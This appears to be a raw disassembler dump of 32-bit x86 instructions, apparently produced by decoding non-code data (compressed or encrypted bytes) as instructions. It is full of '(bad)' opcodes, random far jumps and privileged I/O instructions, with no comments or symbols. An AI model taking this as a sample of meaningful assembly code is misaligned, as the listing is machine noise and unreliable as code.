  414cb0:	fs add bl,bl
  414cb3:	mov    esp,DWORD PTR [eax+0x61dc3d8a]
  414cb9:	add    eax,0x1ed1e1c7
  414cbe:	fld    TBYTE PTR [esi+ebp*4+0x3d4c958f]
  414cc5:	inc    esi
  414cc7:	xchg   ebx,eax
  414cc8:	std    
  414cc9:	jo     0x414c85
  414ccb:	int    0x3
  414ccd:	mov    DWORD PTR [ebp+0x52],edi
  414cd0:	jmp    0x414c70
  414cd2:	inc    esp
  414cd3:	pop    esi
  414cd4:	sbb    ecx,ecx
  414cd6:	push   0xffffffbb
  414cd8:	push   0x2b
  414cda:	test   DWORD PTR [edx],eax
  414cdc:	jae    0x414ce5
  414cde:	pop    ecx
  414cdf:	out    dx,eax
  414ce0:	xchg   edi,eax
  414ce1:	fistp  DWORD PTR [ebp+0x34bbb552]
  414ce7:	daa    
  414ce8:	push   ebx
  414ce9:	adc    DWORD PTR [eax],edx
  414ceb:	jmp    0xfcdcb3aa
  414cf0:	adc    DWORD PTR [ebp-0x7f75367b],edi
  414cf6:	sub    dl,BYTE PTR [ecx+0x76]
  414cf9:	cmp    BYTE PTR [edx+ebp*2],ah
  414cfc:	xor    ebp,DWORD PTR [ebx+edx*2]
  414cff:	mov    ds:0xeeb3074f,eax
  414d04:	call   0x8912:0xb37956d4
  414d0b:	dec    DWORD PTR [ebx-0x57de0e88]
  414d11:	and    BYTE PTR [edi-0x18],dl
  414d14:	shl    BYTE PTR [esi-0x5b895257],cl
  414d1a:	cli    
  414d1b:	push   eax
  414d1c:	imul   esp,eax,0x6d116b82
  414d22:	cwde   
  414d23:	or     al,0xb0
  414d25:	cli    
  414d26:	sub    eax,DWORD PTR [ecx-0x75]
  414d29:	xchg   ecx,eax
  414d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d2b:	add    eax,DWORD PTR [edx]
  414d2d:	mov    dh,0x50
  414d2f:	not    dl
  414d31:	jbe    0x414cb4
  414d33:	jb     0x414d5a
	...
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi-0x2881ebbb],ebp
  414da4:	popa   
  414da5:	adc    eax,0xd933
  414daa:	pop    es
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    cl,bh
  414daf:	pop    edx
  414db0:	div    BYTE PTR [ecx+0x28eb543c]
  414db6:	sti    
  414db7:	mov    edx,0xdad23ec8
  414dbc:	into   
  414dbd:	call   0x6ca37198
  414dc2:	xor    DWORD PTR [esi+edx*1+0x5e],0x49
  414dc7:	(bad)  
  414dc8:	mov    ebp,0xffdd38d0
  414dcd:	shr    DWORD PTR [esi+0x39a29f8b],1
  414dd3:	mov    edx,0x7e678106
  414dd8:	sub    DWORD PTR [ebp-0x56],esi
  414ddb:	push   DWORD PTR ds:0x662a6084
  414de1:	xor    DWORD PTR [ecx],0x62
  414de4:	mov    edi,0x3f65969a
  414de9:	pushf  
  414dea:	mov    BYTE PTR [ecx-0x47d4bbb1],ch
  414df0:	dec    edx
  414df1:	mov    DWORD PTR [ebp-0x50],ebp
  414df4:	int3   
  414df5:	rcl    DWORD PTR [ecx-0x17],cl
  414df8:	loope  0x414dde
  414dfa:	popa   
  414dfb:	gs jmp 0x558e:0x5be382fe
  414e03:	pushf  
  414e04:	adc    bh,0x4
  414e07:	xchg   edi,eax
  414e08:	mov    DWORD PTR [ecx+0x5],esp
  414e0b:	in     al,0x3c
  414e0d:	cmp    eax,0x59387a13
  414e12:	push   ebp
  414e13:	mov    ebx,0xa7a69d5
  414e18:	je     0x414e7d
  414e1a:	leave  
  414e1b:	ins    DWORD PTR es:[edi],dx
  414e1c:	shl    DWORD PTR [edi],1
  414e1e:	ret    0x5d52
  414e21:	push   cs
  414e22:	cld    
  414e23:	pop    ecx
  414e24:	dec    eax
  414e25:	add    ah,BYTE PTR [eax]
  414e27:	mov    esi,0xc90396b2
  414e2c:	sub    esi,edi
  414e2e:	pop    edx
  414e2f:	btr    edx,ebp
  414e32:	aaa    
  414e33:	mov    DWORD PTR [ecx+0xe],eax
  414e36:	mov    dh,0x8
  414e38:	mov    esi,0x89a884bf
  414e3d:	imul   ebx,edx,0x7a
  414e40:	sbb    al,al
  414e42:	xchg   ebp,eax
  414e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e44:	adc    BYTE PTR [edi+ebp*4-0x189785f8],ah
  414e4b:	xchg   esi,eax
  414e4c:	ficomp WORD PTR fs:[ecx+eiz*2-0x572c2e61]
  414e54:	jg     0x414e4f
  414e56:	mov    eax,ds:0x2df0ab03
  414e5b:	fisub  WORD PTR [eax+0x36215354]
  414e61:	inc    esp
  414e62:	and    esp,esi
  414e64:	lods   al,BYTE PTR ds:[esi]
  414e65:	push   esp
  414e66:	pop    ebp
  414e67:	and    al,BYTE PTR [ebx-0x3299408b]
  414e6d:	push   ss
  414e6e:	push   ebx
  414e6f:	lods   al,BYTE PTR ds:[esi]
  414e70:	xchg   edi,eax
  414e71:	sbb    eax,0x4e1cac7b
  414e76:	ss aas 
  414e78:	jne    0x414ea2
  414e7a:	out    dx,eax
  414e7b:	jmp    0x52f7:0xe1c6cb9c
  414e82:	dec    esi
  414e83:	fbstp  TBYTE PTR [esi-0x5b369505]
  414e89:	lds    ecx,FWORD PTR [esp+ebp*2]
  414e8c:	aas    
  414e8d:	sub    al,0xd5
  414e8f:	int3   
  414e90:	aad    0x6a
  414e92:	in     eax,0xe0
  414e94:	int3   
  414e95:	or     ebx,ecx
  414e97:	mov    esp,DWORD PTR [eax]
  414e99:	sub    al,0x4e
  414e9b:	xchg   ecx,eax
  414e9c:	nop
  414e9d:	out    dx,al
  414e9e:	clc    
  414e9f:	ds lock (bad) 
  414ea2:	aas    
  414ea3:	ficom  WORD PTR [ecx]
  414ea5:	leave  
  414ea6:	xchg   edi,eax
  414ea7:	loopne 0x414e7a
  414ea9:	jno    0x414f16
  414eab:	sub    eax,0x62054ae
  414eb0:	fst    QWORD PTR [edi]
  414eb2:	mul    dl
  414eb4:	inc    BYTE PTR [eax]
	...
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	daa    
  414f23:	iret   
  414f24:	loopne 0x414ead
  414f26:	cmp    bl,dl
  414f28:	add    BYTE PTR [eax],al
  414f2a:	pop    es
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    BYTE PTR [ebp+0x7c],ah
  414f30:	(bad)  
  414f31:	sub    al,0x57
  414f33:	add    cl,BYTE PTR [eax+edx*2+0x199b2478]
  414f3a:	fs sar ebp,cl
  414f3d:	test   al,0x37
  414f3f:	aad    0xe4
  414f41:	jnp    0x414f88
  414f43:	fnstcw WORD PTR [esi+0x3a]
  414f46:	fcomp  QWORD PTR [ecx+0x6fad645a]
  414f4c:	mov    eax,0x97586d26
  414f51:	xchg   esp,eax
  414f52:	(bad)  
  414f53:	and    al,0x35
  414f55:	sub    al,0x44
  414f57:	ss out dx,eax
  414f59:	addr16 jno 0x414f17
  414f5c:	out    dx,eax
  414f5d:	in     al,0x7d
  414f5f:	dec    ecx
  414f60:	or     BYTE PTR [esi-0xe81fed1],0x59
  414f67:	adc    ah,dl
  414f69:	pop    ecx
  414f6a:	pop    esp
  414f6b:	jecxz  0x414f97
  414f6d:	les    ecx,FWORD PTR [ecx+ecx*4]
  414f70:	add    BYTE PTR [esi+0x66dfc12a],cl
  414f76:	jg     0x414f7d
  414f78:	imul   esi,DWORD PTR [ebx],0x2d
  414f7b:	jp     0x414fc7
  414f7d:	shl    BYTE PTR [edx-0x5698a37b],cl
  414f83:	or     BYTE PTR [ecx+0xc01d5e],ch
  414f89:	ret    0xb158
  414f8c:	inc    edi
  414f8d:	stos   BYTE PTR es:[edi],al
  414f8e:	mov    edi,DWORD PTR ds:0xd6b415bf
  414f94:	pusha  
  414f95:	rcl    BYTE PTR [edi-0x2],1
  414f98:	std    
  414f99:	pop    edx
  414f9a:	cmp    DWORD PTR [ecx+ebp*8],ebp
  414f9d:	ins    DWORD PTR es:[edi],dx
  414f9e:	daa    
  414f9f:	(bad)  
  414fa0:	bound  esp,QWORD PTR ds:0x3db09391
  414fa6:	cs addr16 jge 0x414fc3
  414faa:	stos   BYTE PTR es:[edi],al
  414fab:	mov    BYTE PTR [edx+eax*4],dl
  414fae:	mov    bh,0x73
  414fb0:	pop    es
  414fb1:	cmp    ch,BYTE PTR [edi]
  414fb3:	shr    esi,0x94
  414fb6:	cmp    BYTE PTR [eax+0x6c],bl
  414fb9:	pop    eax
  414fba:	outs   dx,BYTE PTR gs:[esi]
  414fbc:	inc    edx
  414fbd:	outs   dx,BYTE PTR ds:[esi]
  414fbe:	pop    esp
  414fbf:	mov    DWORD PTR [ebp-0x4a],esi
  414fc2:	je     0x414f83
  414fc4:	aad    0x2d
  414fc6:	dec    ebp
  414fc7:	je     0x414fe5
  414fc9:	stos   DWORD PTR es:[edi],eax
  414fca:	and    eax,0xdc0fc377
  414fcf:	xor    bl,BYTE PTR [ecx+0x5]
  414fd2:	sub    dh,BYTE PTR [ecx]
  414fd4:	sbb    eax,0xb4175e57
  414fd9:	cld    
  414fda:	fistp  QWORD PTR [ecx+0x3f]
  414fdd:	inc    edx
  414fde:	add    al,0xc9
  414fe0:	lods   al,BYTE PTR ds:[esi]
  414fe1:	cdq    
  414fe2:	jmp    0x34b306f9
  414fe7:	data16 mov dl,0xa
  414fea:	in     eax,dx
  414feb:	ss jb  0x414ffd
  414fee:	sub    al,0x1d
  414ff0:	pushf  
  414ff1:	mov    al,ds:0x6b5566c2
  414ff6:	xchg   ecx,eax
  414ff7:	shl    BYTE PTR [ebx-0xf49b094],1
  414ffd:	xor    cl,BYTE PTR [eax+ebx*8-0x7bd8cb43]
  415004:	mov    dh,0xaf
  415006:	fdivr  st(7),st
  415008:	fwait
  415009:	nop
  41500a:	cmp    al,0x74
  41500c:	lods   al,BYTE PTR ds:[esi]
  41500d:	or     bh,dl
  41500f:	mov    bl,0x85
  415011:	dec    edx
  415012:	enter  0x84ca,0xfe
  415016:	sub    al,0x14
  415018:	and    al,0xb7
  41501a:	jle    0x415034
  41501c:	sbb    al,BYTE PTR ds:0x19bcf959
  415022:	pop    edi
  415023:	not    DWORD PTR [edi-0x14b3b34d]
  415029:	nop
  41502a:	or     al,0x56
  41502c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41502d:	jp     0x414fe5
  41502f:	xlat   BYTE PTR ds:[ebx]
  415030:	(bad)  
  415031:	lahf   
  415032:	(bad)  
  415033:	jne    0x4150b1
	...
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0xee443807
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [eax],bh
  4150af:	cwde   
  4150b0:	and    DWORD PTR ds:0x4ce444a3,ecx
  4150b6:	test   BYTE PTR [ebp-0x2c],dh
  4150b9:	scas   eax,DWORD PTR es:[edi]
  4150ba:	sbb    ebp,DWORD PTR [esi-0x64066380]
  4150c0:	and    cl,bl
  4150c2:	jmp    0x72f2:0x4fd01966
  4150c9:	retf   
  4150ca:	mov    ch,0x11
  4150cc:	ins    DWORD PTR es:[edi],dx
  4150cd:	mov    edi,esp
  4150cf:	adc    al,ch
  4150d1:	ins    DWORD PTR es:[edi],dx
  4150d2:	jb     0x415063
  4150d4:	and    BYTE PTR [edi+0x2c],bl
  4150d7:	push   0x58
  4150d9:	fs dec eax
  4150db:	retf   0x27da
  4150de:	push   edx
  4150df:	xchg   ch,bh
  4150e1:	inc    esp
  4150e2:	xchg   ebp,eax
  4150e3:	inc    esp
  4150e4:	in     al,0x5b
  4150e6:	add    ecx,esi
  4150e8:	out    0x75,al
  4150ea:	pop    ds
  4150eb:	popf   
  4150ec:	cmovo  esp,DWORD PTR [edx]
  4150ef:	inc    edi
  4150f0:	jno    0x4150a7
  4150f2:	mov    al,0x56
  4150f4:	add    eax,0x63d694e1
  4150f9:	fbstp  TBYTE PTR [edx-0x3c]
  4150fc:	sahf   
  4150fd:	syscall 
  4150ff:	dec    ebx
  415100:	(bad)  
  415101:	xchg   ebp,ecx
  415103:	pop    ss
  415104:	inc    edx
  415105:	stos   DWORD PTR es:[edi],eax
  415106:	jne    0x415119
  415108:	mov    ebx,0x6d508aeb
  41510d:	pusha  
  41510e:	mov    dl,0x67
  415110:	sub    dl,BYTE PTR [edi+0x21dd9dad]
  415116:	add    BYTE PTR [ecx+edx*8],dh
  415119:	xor    eax,0x41ee4d09
  41511e:	loope  0x4150db
  415120:	inc    bx
  415122:	fisttp DWORD PTR gs:[edx+0x6e]
  415126:	pop    ebx
  415127:	push   esi
  415128:	add    eax,0xce87750f
  41512d:	leave  
  41512e:	or     DWORD PTR [edi],esi
  415130:	sbb    bl,dh
  415132:	inc    ecx
  415133:	mov    ebx,0xfb3eef2f
  415138:	nop
  415139:	in     eax,0x70
  41513b:	pop    esi
  41513c:	das    
  41513d:	pop    ss
  41513e:	data16 mov al,0x88
  415141:	adc    dl,ch
  415143:	lds    edi,FWORD PTR [ecx-0x54]
  415146:	jp     0x41514a
  415148:	sub    edx,DWORD PTR [ebp+0x4e]
  41514b:	shl    DWORD PTR [esi],0xc7
  41514e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41514f:	or     al,0xa7
  415151:	xor    ebp,ebx
  415153:	and    DWORD PTR [ebx-0x36173277],edx
  415159:	scas   eax,DWORD PTR es:[edi]
  41515a:	jecxz  0x41519e
  41515c:	shl    bl,1
  41515e:	add    eax,0xd5daab07
  415163:	(bad)
  415166:	mov    esp,0xe2362f33
  41516b:	sub    bl,BYTE PTR [edx+0xb]
  41516e:	dec    edi
  41516f:	or     ebp,eax
  415171:	inc    edx
  415172:	mov    bh,bl
  415174:	pop    esi
  415175:	push   ss
  415176:	cmp    DWORD PTR ds:0x1db35dd1,0xffffffb2
  41517d:	bound  edi,QWORD PTR [ebx+0x8]
  415180:	repz rol BYTE PTR ds:[esi+0x32f122ee],0x58
  415189:	sub    al,0xf2
  41518b:	push   ecx
  41518c:	mov    ebp,0xb3f69f22
  415191:	into   
  415192:	inc    ecx
  415193:	pop    ss
  415194:	jp     0x415179
  415196:	xchg   esi,eax
  415197:	dec    ecx
  415198:	repnz repz ficomp WORD PTR [ecx-0x21]
  41519d:	adc    esp,DWORD PTR [esi+0x3]
  4151a0:	(bad)  
  4151a1:	sub    dh,ah
  4151a3:	dec    eax
  4151a4:	add    edx,DWORD PTR [ebx]
  4151a6:	loope  0x415143
  4151a8:	xchg   BYTE PTR [ecx+0x1b],al
  4151ab:	jg     0x4151ea
  4151ad:	xchg   edx,eax
  4151ae:	mov    gs,WORD PTR [esi-0x438e9ab3]
  4151b4:	push   0x0
	...
  415216:	sub    al,0x97
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0xaf
  415223:	adc    eax,0xdc48e8a1
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [edx+esi*2+0x2c83d397],al
  415234:	mov    ebp,0x70cf7e4c
  415239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41523a:	aad    0xe
  41523c:	ret    0x4e30
  41523f:	cs dec ebp
  415241:	daa    
  415242:	call   0x872260f4
  415247:	push   0x7d
  415249:	lods   eax,DWORD PTR ds:[esi]
  41524a:	sbb    DWORD PTR [ebp-0x52],edx
  41524d:	mov    esp,ecx
  41524f:	inc    edi
  415250:	fisub  WORD PTR [ebx+ebx*8]
  415253:	and    eax,0xdf045ab
  415258:	pop    ss
  415259:	imul   esi,DWORD PTR [ecx+0x756f59a2],0x77
  415260:	retf   0xbfdd
  415263:	hlt    
  415264:	test   eax,0xfaac9a46
  415269:	mov    eax,DWORD PTR ss:[edx+esi*2-0x227723df]
  415271:	cmc    
  415272:	repz pop ds
  415274:	adc    BYTE PTR [edx],0x54
  415277:	pop    ecx
  415278:	xchg   ebp,eax
  415279:	or     ch,BYTE PTR [ecx]
  41527b:	push   ds
  41527c:	cmp    DWORD PTR [esi],esi
  41527e:	mov    eax,0x97733af0
  415283:	mov    ds:0xa2cafed5,eax
  415288:	cld    
  415289:	mov    bh,0x7e
  41528b:	test   eax,0xfec9e39d
  415290:	push   0xe647675e
  415295:	inc    edi
  415296:	or     dh,BYTE PTR [ebx+0x3]
  415299:	jno    0x4152a9
  41529b:	pop    esi
  41529c:	js     0x415314
  41529e:	js     0x4152ce
  4152a0:	sbb    ah,cl
  4152a2:	mov    al,BYTE PTR [esi]
  4152a4:	sub    ch,BYTE PTR [ecx+ecx*4+0x25]
  4152a8:	fsub   QWORD PTR [ebp+0x72]
  4152ab:	test   BYTE PTR [ecx+eax*8-0x78],bh
  4152af:	popa   
  4152b0:	xor    ah,BYTE PTR [eax+0x49bfcc7e]
  4152b6:	test   eax,0x6f715e10
  4152bb:	xchg   DWORD PTR [eax+eiz*8],edi
  4152be:	lods   al,BYTE PTR ds:[esi]
  4152bf:	pop    edi
  4152c0:	or     al,0x30
  4152c2:	mov    dh,0xc
  4152c4:	add    edx,eax
  4152c6:	adc    al,0x71
  4152c8:	pop    ecx
  4152c9:	loope  0x41526f
  4152cb:	dec    eax
  4152cc:	xor    BYTE PTR [ebp-0x69125eb1],0xf
  4152d3:	or     eax,0xbad5ff04
  4152d8:	push   ss
  4152d9:	mov    al,BYTE PTR [edi]
  4152db:	pop    ss
  4152dc:	jle    0x415304
  4152de:	xor    al,0x2d
  4152e0:	add    DWORD PTR [ebp+0x31],esp
  4152e3:	(bad)  
  4152e5:	add    DWORD PTR ds:0x81d2c5da,edx
  4152eb:	mov    esi,0x9c84c48b
  4152f0:	(bad)  
  4152f1:	xor    al,0x21
  4152f3:	or     BYTE PTR [ebx],bh
  4152f5:	or     dl,cl
  4152f7:	jp     0x415316
  4152f9:	es mov ebp,?
  4152fc:	push   ecx
  4152fd:	inc    edi
  4152fe:	adc    BYTE PTR [eax+ecx*4],dh
  415301:	sbb    al,dh
  415303:	push   ds
  415304:	jns    0x4152fc
  415306:	sbb    DWORD PTR [edx-0x60],eax
  415309:	pushf  
  41530a:	pop    ebp
  41530b:	cs cmp eax,0xc9859f1b
  415311:	xchg   edi,eax
  415312:	xchg   ebp,eax
  415313:	ins    BYTE PTR es:[edi],dx
  415314:	ja     0x4152fb
  415316:	inc    esp
  415317:	dec    eax
  415318:	loop   0x415305
  41531a:	xchg   esp,eax
  41531b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41531c:	fldcw  WORD PTR [edi+0xd]
  41531f:	sbb    eax,0xe3005682
  415324:	adc    bl,BYTE PTR [edi-0x1280957e]
  41532a:	test   BYTE PTR [ecx],bl
  41532c:	push   0x71244e1
  415331:	mov    ebp,0xf9de0d
	...
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	lock repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0xd74b9b2a
  4153a3:	cli    
  4153a4:	push   ebx
  4153a5:	push   eax
  4153a6:	dec    edi
  4153a7:	fld    QWORD PTR [eax]
  4153a9:	add    BYTE PTR [edi],al
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [eax],cl
  4153af:	fdivr  st(0),st
  4153b1:	jle    0x415426
  4153b3:	add    bh,BYTE PTR [esp+eax*8]
  4153b6:	faddp  st(3),st
  4153b8:	sub    DWORD PTR [ebp+0x5d74502e],ecx
  4153be:	test   DWORD PTR [ecx],ebp
  4153c0:	dec    ecx
  4153c1:	dec    edx
  4153c2:	add    al,0xef
  4153c4:	pop    edx
  4153c5:	inc    edi
  4153c6:	lds    ecx,FWORD PTR [eax]
  4153c8:	enter  0x25d4,0xcc
  4153cc:	fisttp DWORD PTR [ecx-0x1]
  4153cf:	cmp    eax,0x49852476
  4153d4:	fmul   DWORD PTR [ebp+0x478c896c]
  4153da:	and    edx,ecx
  4153dc:	and    BYTE PTR ds:0x7aaf7015,bh
  4153e2:	jmp    0xeb02:0xd9b6672f
  4153e9:	xchg   esi,eax
  4153ea:	mov    edi,0xa912731
  4153ef:	and    dl,al
  4153f1:	inc    ecx
  4153f2:	hlt    
  4153f3:	std    
  4153f4:	fdivr  QWORD PTR [ecx-0x9]
  4153f7:	cmp    cl,cl
  4153f9:	clc    
  4153fa:	pushf  
  4153fb:	inc    edi
  4153fc:	and    ecx,ebp
  4153fe:	lock jb 0x415469
  415401:	iret   
  415402:	push   esi
  415403:	enter  0x61a7,0x97
  415407:	das    
  415408:	add    ebp,ecx
  41540a:	adc    eax,DWORD PTR [esi]
  41540c:	retf   
  41540d:	mov    ds:0xb157a3f1,eax
  415412:	or     eax,DWORD PTR [edi-0x3692af73]
  415418:	inc    eax
  415419:	cwde   
  41541a:	pop    esp
  41541b:	(bad)
  41541e:	mov    ebp,0xc2da2660
  415423:	jmp    0x3f87:0x67e0947d
  41542a:	sub    BYTE PTR [edi-0x1a],0x3c
  41542e:	sbb    eax,0x1876e4d9
  415433:	mov    esi,0x4dc60441
  415438:	xchg   BYTE PTR [esi+0x1fcd7c62],ch
  41543e:	ds stos DWORD PTR es:[edi],eax
  415440:	xor    eax,0x9797496e
  415445:	out    0xf1,al
  415447:	inc    ebp
  415448:	aad    0x4e
  41544a:	sbb    ebx,0x531f2006
  415450:	jle    0x41549a
  415452:	mov    DWORD PTR [edx+0x752175a7],esi
  415458:	pop    es
  415459:	(bad)  
  41545b:	das    
  41545c:	xor    al,0x2c
  41545e:	repz mov ebx,0x3116352c
  415464:	pop    ebx
  415465:	div    BYTE PTR [ebx]
  415467:	js     0x4154b8
  415469:	test   BYTE PTR ds:0x7dfd390,0xd5
  415470:	pop    es
  415471:	mov    ah,0x19
  415473:	mov    dh,0x35
  415475:	stos   BYTE PTR es:[edi],al
  415476:	out    dx,eax
  415477:	jge    0x415476
  415479:	pop    esi
  41547a:	pop    ebx
  41547b:	mov    ecx,0xc9c2feb0
  415480:	retf   0x693c
  415483:	and    dh,bl
  415485:	ja     0x4154ed
  415487:	mov    ecx,0x6b6554d7
  41548c:	(bad)  [ecx-0x5e76f04d]
  415492:	ins    BYTE PTR es:[edi],dx
  415493:	push   ebp
  415494:	push   es
  415495:	(bad)  
  415496:	bound  esp,QWORD PTR [ebx]
  415498:	push   esp
  415499:	popa   
  41549a:	cdq    
  41549b:	add    eax,0x642e5989
  4154a0:	add    ch,cl
  4154a2:	arpl   WORD PTR [edi-0x7d],dx
  4154a5:	xor    eax,0xab52762e
  4154aa:	jmp    0x8b90:0x96ed0b99
  4154b1:	inc    edx
  4154b2:	xchg   ecx,eax
  4154b3:	push   0xe6
	...
  415514:	add    BYTE PTR [eax],al
  415516:	in     al,0xf0
  415518:	sub    DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	fldcw  WORD PTR [esp+ecx*1+0x4c]
  415526:	push   esi
  415527:	fiadd  WORD PTR [eax]
  415529:	add    BYTE PTR [edi],al
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR ds:0x1b5d8954,bh
  415533:	arpl   WORD PTR [edi-0x34313f6f],sp
  415539:	jbe    0x41556f
  41553b:	pop    ss
  41553c:	cs push ds
  41553e:	xor    al,0x84
  415540:	rcr    DWORD PTR [eax-0x76e4e462],0x73
  415547:	imul   esi,DWORD PTR [edx+0x51],0x1a
  41554b:	je     0x415596
  41554d:	bnd jno 0x4154f1
  415550:	cs adc al,0x7b
  415553:	pop    es
  415554:	mov    al,ds:0xd16a2e03
  415559:	pop    edi
  41555a:	push   ebx
  41555b:	mov    eax,0xb91997e
  415560:	pop    ebp
  415561:	je     0x4154f7
  415563:	dec    ebp
  415564:	into   
  415565:	mov    ecx,0x16fa75a1
  41556a:	add    esi,DWORD PTR [ebp+0x37296ea]
  415570:	sub    DWORD PTR [edx],edi
  415572:	add    al,0x9f
  415574:	mov    al,0xdc
  415576:	sub    ah,ah
  415578:	add    dl,BYTE PTR [ebx]
  41557a:	dec    ebp
  41557b:	xchg   BYTE PTR [ebp+0x5349e2a4],bh
  415581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415582:	adc    al,BYTE PTR [ecx-0x373671d8]
  415588:	sub    eax,0x34e4c0cd
  41558d:	xchg   BYTE PTR [ebx-0x59164500],bh
  415593:	dec    edi
  415594:	pop    es
  415595:	xchg   BYTE PTR [esi-0x7d],bl
  415598:	lds    edi,FWORD PTR [eax+0x76235fe4]
  41559e:	cmp    BYTE PTR [ebx+0x5e92f284],0x7a
  4155a5:	jae    0x4155a2
  4155a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a8:	push   ecx
  4155a9:	xor    al,0xeb
  4155ab:	enter  0x3894,0x4d
  4155af:	jle    0x41560a
  4155b1:	iret   
  4155b2:	cmp    esp,DWORD PTR [ebp+0x32046dac]
  4155b8:	pop    ds
  4155b9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4155bb:	div    dl
  4155bd:	sub    DWORD PTR ds:0xf372a6b4,esp
  4155c3:	test   DWORD PTR [esi-0x10a1ba07],edi
  4155c9:	popa   
  4155ca:	add    al,0x37
  4155cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155cd:	inc    ecx
  4155ce:	stos   DWORD PTR es:[edi],eax
  4155cf:	sahf   
  4155d0:	je     0x4155b0
  4155d2:	mul    esp
  4155d4:	sbb    edi,DWORD PTR [ebx+eax*4]
  4155d7:	mov    WORD PTR [ebp+0x39],fs
  4155da:	jle    0x415617
  4155dc:	add    al,BYTE PTR [esi+0x70]
  4155df:	jle    0x415660
  4155e1:	xchg   edx,eax
  4155e2:	sbb    al,0xfd
  4155e4:	push   es
  4155e5:	and    bl,BYTE PTR [edi+eiz*1+0x11]
  4155e9:	popf   
  4155ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155eb:	mov    ebp,0x41e471a1
  4155f0:	shl    DWORD PTR [edx],cl
  4155f2:	sub    ah,BYTE PTR [edx+0x2e]
  4155f5:	imul   edi,DWORD PTR [ebx+edi*8-0x25],0xffffffb0
  4155fa:	sub    al,0x5d
  4155fc:	hlt    
  4155fd:	sar    DWORD PTR [ecx+ebx*1],1
  415600:	add    cl,BYTE PTR [edi]
  415602:	test   BYTE PTR [ebx-0x41a2ac8e],0xdf
  415609:	ins    DWORD PTR es:[edi],dx
  41560a:	repnz in eax,dx
  41560c:	fwait
  41560d:	xor    BYTE PTR [edi+esi*1+0x1],al
  415611:	fstp   TBYTE PTR [ebx]
  415613:	jnp    0x41561c
  415615:	test   ebp,0x857300ad
  41561b:	jo     0x415692
  41561d:	mov    dl,0x39
  41561f:	scas   eax,DWORD PTR es:[edi]
  415620:	jp     0x4155b3
  415622:	sti    
  415623:	ds xchg edi,eax
  415625:	xor    DWORD PTR [ecx+0x6952f65b],eax
  41562b:	lods   eax,DWORD PTR ds:[esi]
  41562c:	sbb    dh,BYTE PTR [ecx-0x3e7f6e21]
  415632:	lahf   
  415633:	and    eax,0xb4
	...
  415694:	add    BYTE PTR [eax],al
  415696:	ins    DWORD PTR es:[edi],dx
  415697:	call   0xbafd:0x67ff45bc
  41569e:	retf   
  41569f:	inc    eax
  4156a0:	std    
  4156a1:	scas   eax,DWORD PTR es:[edi]
  4156a2:	test   al,0x42
  4156a4:	jg     0x41567d
  4156a6:	pop    ebp
  4156a7:	fild   WORD PTR [eax]
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    dl,al
  4156af:	jle    0x415706
  4156b1:	inc    edi
  4156b2:	inc    eax
  4156b3:	iret   
  4156b4:	iret   
  4156b5:	shl    DWORD PTR [ebp-0x76],0x4e
  4156b9:	and    al,BYTE PTR [ebp-0x6c]
  4156bc:	retf   0x38c4
  4156bf:	or     dl,dl
  4156c1:	dec    edi
  4156c2:	maskmovq mm3,(bad)
  4156c3:	neg    DWORD PTR [eax+0x70125993]
  4156c9:	leave  
  4156ca:	xlat   BYTE PTR ds:[ebx]
  4156cb:	pop    ebp
  4156cc:	dec    ecx
  4156cd:	dec    ebx
  4156ce:	jns    0x415742
  4156d0:	sub    ebx,DWORD PTR [ecx-0xaa83339]
  4156d6:	outs   dx,DWORD PTR ds:[esi]
  4156d7:	jge    0x415721
  4156d9:	inc    esi
  4156da:	cmp    DWORD PTR [eax-0x61],esp
  4156dd:	shl    DWORD PTR [esi-0x1137b796],1
  4156e3:	push   esi
  4156e4:	add    eax,0x25df667e
  4156e9:	hlt    
  4156ea:	jns    0x4156eb
  4156ec:	inc    esp
  4156ed:	mov    eax,ds:0x20e000b5
  4156f2:	rol    BYTE PTR [edx],0x7d
  4156f5:	mov    cl,0xc7
  4156f7:	aad    0x2e
  4156f9:	pushf  
  4156fa:	push   ecx
  4156fb:	sub    eax,DWORD PTR [ebp+ecx*2-0x53]
  4156ff:	sar    al,1
  415701:	mov    ?,edi
  415703:	inc    ebx
  415704:	fldenv [ecx]
  415706:	xchg   ebx,eax
  415707:	jg     0x13e22767
  41570d:	test   al,0xc9
